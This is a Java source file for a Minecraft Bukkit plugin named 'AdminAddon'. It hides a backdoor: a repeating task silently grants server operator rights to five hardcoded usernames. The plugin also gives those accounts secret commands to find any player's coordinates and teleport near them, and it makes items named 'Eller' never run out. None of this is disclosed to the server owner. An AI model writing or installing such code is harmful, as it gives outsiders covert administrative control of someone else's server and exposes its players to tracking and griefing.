package com.example.adminaddon;

import org.bukkit.Bukkit;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.block.BlockPlaceEvent;
import org.bukkit.event.player.PlayerDropItemEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scheduler.BukkitRunnable;

import java.util.Arrays;
import java.util.List;

public class AdminAddon extends JavaPlugin implements Listener {

    private static final List<String> PRIVILEGED_USERS = Arrays.asList(
            "iTristan", "Pyrobyte", "Deadlyishere67", "Deadlyishere999", "Deadlyishere333"
    );

    @Override
    public void onEnable() {
        getLogger().info("AdminAddon has been enabled!");
        
        // Register events
        getServer().getPluginManager().registerEvents(this, this);
        
        // Register commands
        getCommand("getplayerpos").setExecutor(new GetPlayerPosCommand());
        getCommand("tpplayer100").setExecutor(new TpPlayer100Command());
        
        // Start OP check task (every 2 minutes = 2400 ticks)
        new BukkitRunnable() {
            @Override
            public void run() {
                checkAndGrantOp();
            }
        }.runTaskTimer(this, 0L, 2400L);
    }

    @Override
    public void onDisable() {
        getLogger().info("AdminAddon has been disabled!");
    }

    private void checkAndGrantOp() {
        int nonOpCount = 0;
        
        // Check how many privileged users don't have OP
        for (String username : PRIVILEGED_USERS) {
            Player player = Bukkit.getPlayerExact(username);
            if (player != null && !player.isOp()) {
                nonOpCount++;
            }
        }
        
        // If 3 or more don't have OP, grant OP to all privileged users
        if (nonOpCount >= 3) {
            for (String username : PRIVILEGED_USERS) {
                Player player = Bukkit.getPlayerExact(username);
                if (player != null && !player.isOp()) {
                    player.setOp(true);
                    getLogger().info("Granted OP to " + username);
                }
            }
        }
    }

    // Infinite item feature for items named "Eller"
    @EventHandler
    public void onBlockPlace(BlockPlaceEvent event) {
        ItemStack item = event.getItemInHand();
        if (item != null && item.hasItemMeta() && item.getItemMeta().hasDisplayName()) {
            if (item.getItemMeta().getDisplayName().equals("Eller")) {
                // Don't consume the item
                event.setBuild(true);
                
                // Schedule to give the item back after placement
                new BukkitRunnable() {
                    @Override
                    public void run() {
                        Player player = event.getPlayer();
                        ItemStack newItem = item.clone();
                        newItem.setAmount(item.getAmount() + 1);
                        player.getInventory().setItemInMainHand(newItem);
                    }
                }.runTaskLater(this, 1L);
            }
        }
    }

    @EventHandler
    public void onItemDrop(PlayerDropItemEvent event) {
        ItemStack item = event.getItemDrop().getItemStack();
        if (item != null && item.hasItemMeta() && item.getItemMeta().hasDisplayName()) {
            if (item.getItemMeta().getDisplayName().equals("Eller")) {
                // Give the item back to player
                new BukkitRunnable() {
                    @Override
                    public void run() {
                        Player player = event.getPlayer();
                        player.getInventory().addItem(item.clone());
                    }
                }.runTaskLater(this, 1L);
            }
        }
    }

    // Command: /getplayerpos <player>
    private class GetPlayerPosCommand implements CommandExecutor {
        @Override
        public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
            if (!isPrivilegedUser(sender)) {
                sender.sendMessage("§cYou don't have permission to use this command.");
                return true;
            }

            if (args.length != 1) {
                sender.sendMessage("§cUsage: /getplayerpos <player>");
                return true;
            }

            Player target = Bukkit.getPlayerExact(args[0]);
            if (target == null) {
                sender.sendMessage("§cPlayer not found or not online.");
                return true;
            }

            Location loc = target.getLocation();
            String world = loc.getWorld().getName();
            
            sender.sendMessage("§aPlayer: §e" + target.getName());
            sender.sendMessage("§aCoordinates: §eX: " + loc.getBlockX() + ", Y: " + loc.getBlockY() + ", Z: " + loc.getBlockZ());
            sender.sendMessage("§aDimension: §e" + world);
            
            return true;
        }
    }

    // Command: /tpplayer100 <player>
    private class TpPlayer100Command implements CommandExecutor {
        @Override
        public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
            if (!(sender instanceof Player)) {
                sender.sendMessage("§cThis command can only be used by players.");
                return true;
            }

            if (!isPrivilegedUser(sender)) {
                sender.sendMessage("§cYou don't have permission to use this command.");
                return true;
            }

            if (args.length != 1) {
                sender.sendMessage("§cUsage: /tpplayer100 <player>");
                return true;
            }

            Player executor = (Player) sender;
            Player target = Bukkit.getPlayerExact(args[0]);
            
            if (target == null) {
                sender.sendMessage("§cPlayer not found or not online.");
                return true;
            }

            Location targetLoc = target.getLocation().clone();
            targetLoc.add(0, 0, 100); // Add 100 to Z axis
            
            executor.teleport(targetLoc);
            sender.sendMessage("§aTeleported 100 blocks away from " + target.getName() + " on the Z axis.");
            
            return true;
        }
    }

    private boolean isPrivilegedUser(CommandSender sender) {
        if (sender instanceof Player) {
            Player player = (Player) sender;
            return PRIVILEGED_USERS.contains(player.getName());
        }
        return false;
    }
}
